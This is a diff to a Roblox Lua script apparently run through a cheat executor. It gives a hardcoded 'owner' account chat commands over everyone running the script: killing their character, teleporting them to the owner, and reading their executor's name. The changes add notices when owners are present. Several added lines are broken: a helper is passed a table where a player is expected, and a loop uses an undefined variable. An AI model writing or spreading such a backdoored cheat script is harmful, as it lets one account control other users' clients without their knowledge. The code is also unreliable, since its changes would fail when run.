@@ -1,4 +1,4 @@
--- Owners Control --
+-- Script Control --
 local ws, plrs, reps, rs, txs
 ws = game:GetService("Workspace")
 plrs = game:GetService("Players")
@@ -9,7 +9,7 @@ txs = game:GetService("TextChatService")
 local vars, plr
 vars = {
   chatv = txs.ChatVersion == Enum.ChatVersion.LegacyChatService,
-  s_des = false, s_cal = false, prefix = "/",
+  s_cal = false, prefix = "/",
   owners = {"bloxfruits_devs09"}
 }
 plr = plrs.LocalPlayer
@@ -22,8 +22,10 @@ function ntfc(m) m = tostring(m)
   end
 end
 
-function str_check(t, n)
-  return t == vars.prefix..n
+function str_check(x, t, n)
+  if table.find(vars.owners, x.Name:lower()) then
+    ntfc("<Roger: "..x.DisplayName:sub(1, 4).."...>")
+  end return t == vars.prefix..n
 end
 
 function rcv_hrp(t)
@@ -54,19 +56,16 @@ function do_cmd(t, n) print(t, n)
   local t = {hrp = rcv_hrp(t), hmoid = rcv_hmoid(t), alive = t_alive(t)}
   local s = {hrp = rcv_hrp(plr), hmoid = rcv_hmoid(plr), alive = t_alive(plr)}
   if table.find(vars.owners, plr.Name:lower()) then return end
-  if str_check(n, "rs") then
+  if str_check(t, n, "rs") then
     if s.hmoid and s.alive then s.hmoid.Health = 0 end
-  elseif str_check(n, "br") then
+  elseif str_check(t, n, "br") then
     if s.hrp and s.alive and t.hrp and t.alive then
       s.hrp.CFrame = CFrame.new(t.hrp.Position + (t.hrp.CFrame.LookVector * 5))
     end
-  elseif str_check(n, "dps") then
-    vars.s_des = not vars.s_des
-    ntfc(vars.s_des)
-  elseif str_check(n, "idt") then
+  elseif str_check(t, n, "idt") then
     if identifyexecutor then ntfc(tostring(identifyexecutor())) else ntfc("api doesn't exist...") end
-  elseif str_check(n, "cmds") then
-    ntfc("prefix:\""..vars.prefix.."\", rs, br, dps")
+  elseif str_check(t, n, "cmds") then
+    ntfc("prefix:\""..vars.prefix.."\", rs, br, idt, cmds")
   end
 end
 
@@ -76,5 +75,5 @@ function do_connect(t)
   end)
 end
 
-for _, user in next, plrs:GetPlayers() do if user then do_connect(user) end end
-plrs.PlayerAdded:Connect(function(t) if t then do_connect(t) end end)
+for _, user in next, plrs:GetPlayers() do if user then do_connect(user) if table.find(vars.owners, t.Name:lower()) then ntfc("[!]: "..t.DisplayName.." is here.") end end end
+plrs.PlayerAdded:Connect(function(t) if t then do_connect(t) if table.find(vars.owners, t.Name:lower()) then ntfc("[!]: "..t.DisplayName.." has joined the server.") end end end)
